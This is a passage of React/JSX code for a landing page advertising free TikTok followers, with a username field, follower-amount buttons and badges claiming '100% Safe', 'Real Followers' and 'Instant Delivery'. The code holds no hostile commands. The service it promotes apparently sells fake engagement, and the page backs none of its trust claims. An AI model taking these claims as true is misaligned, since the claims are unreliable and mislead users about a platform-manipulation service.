                    <div className="flex-grow flex justify-center items-center h-5/6">
                      <div className="text-center">
                        <div className="w-20 h-20 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] rounded-full flex items-center justify-center mx-auto mb-5">
                          <TrendingUp className="h-10 w-10 text-white" />
                        </div>
                        <div className="text-xl font-bold text-white mb-2">Get Followers</div>
                        <div className="text-sm text-gray-400">+5000 followers available</div>
                        <div className="animate-bounce mt-6">
                          <Sparkles className="h-6 w-6 text-[#25F4EE] mx-auto" />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Form */}
            <div className="md:col-span-3">
              <div className="bg-[#1D1D1D] rounded-3xl p-8 shadow-[0_5px_30px_rgba(0,0,0,0.3)] border border-gray-800">
                {formStep === 'form' && (
                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-7">
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem className="space-y-3">
                            <FormLabel className="text-lg font-semibold text-white flex items-center">
                              <div className="mr-2 h-6 w-6 rounded-full bg-[#25F4EE] flex items-center justify-center text-black font-bold">@</div>
                              TikTok Username
                            </FormLabel>
                            <div className="relative">
                              <span className="absolute inset-y-0 left-0 pl-5 flex items-center text-gray-400 text-xl">@</span>
                              <FormControl>
                                <Input
                                  placeholder="your_username"
                                  className="w-full h-16 bg-[#0d0d0d] border-2 border-gray-800 hover:border-[#25F4EE] focus:border-[#25F4EE] rounded-2xl py-6 pl-10 pr-3 text-white text-lg placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-[#25F4EE] transition-all"
                                  {...field}
                                />
                              </FormControl>
                            </div>
                            <FormMessage className="text-[#FE2C55] text-sm font-medium" />
                          </FormItem>
                        )}
                      />
                      
                      <div className="space-y-4">
                        <FormLabel className="text-lg font-semibold text-white flex items-center">
                          <div className="mr-2 h-6 w-6 rounded-full bg-[#FE2C55] flex items-center justify-center text-white font-bold">+</div>
                          Select Followers
                        </FormLabel>
                        <div className="grid grid-cols-3 gap-4">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(1000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 1000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            1,000
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(2500)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 2500 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            2,500
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(5000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 5000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616] relative overflow-hidden
                            `}
                          >
                            5,000
                            {selectedAmount === 5000 && (
                              <div className="absolute -top-1 -right-1 h-5 w-5 bg-[#FE2C55] rounded-full flex items-center justify-center text-white text-xs font-bold">
                                <CheckCircle className="h-3 w-3" />
                              </div>
                            )}
                          </Button>
                        </div>
                      </div>
                      
                      <Button 
                        type="submit" 
                        className="w-full h-16 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] hover:from-[#20E5DF] hover:to-[#F01B48] text-white text-xl font-bold py-4 rounded-2xl transition-all transform hover:scale-[1.02] focus:outline-none"
                        disabled={mutation.isPending}
                      >
                        {mutation.isPending ? (
                          <>
                            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                            Processing...
                          </>
                        ) : (
                          <>
                            <Sparkles className="mr-2 h-5 w-5" />
                            Get Free Followers
                          </>
                        )}
                      </Button>
                      
                      <div className="flex items-center justify-center gap-4 pt-2">
                        <div className="flex items-center text-gray-400 text-sm">
                          <ShieldCheck className="mr-1 h-4 w-4 text-[#25F4EE]" /> 100% Safe
                        </div>
                        <div className="flex items-center text-gray-400 text-sm">
                          <Lock className="mr-1 h-4 w-4 text-[#25F4EE]" /> No Password Required
                        </div>
                      </div>
                    </form>
                  </Form>
                )}
                
                {formStep === 'processing' && <ProcessingAnimation />}
                
                {formStep === 'success' && (
                  <SuccessMessage 
                    username={form.getValues("username")} 
                    followers={selectedAmount.toString()} 
                  />
                )}
              </div>
            </div>
          </div>
          
          {/* Trust signals */}
          <div className="mt-12 text-center">
            <div className="flex flex-wrap justify-center gap-6 md:gap-10">
              <div className="flex items-center gap-2">
                <CheckCircle className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">Real Followers</span>
              </div>
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">100% Secure</span>
              </div>
              <div className="flex items-center gap-2">
                <Flame className="h-5 w-5 text-[#FE2C55]" />
                <span className="text-gray-300">Instant Delivery</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
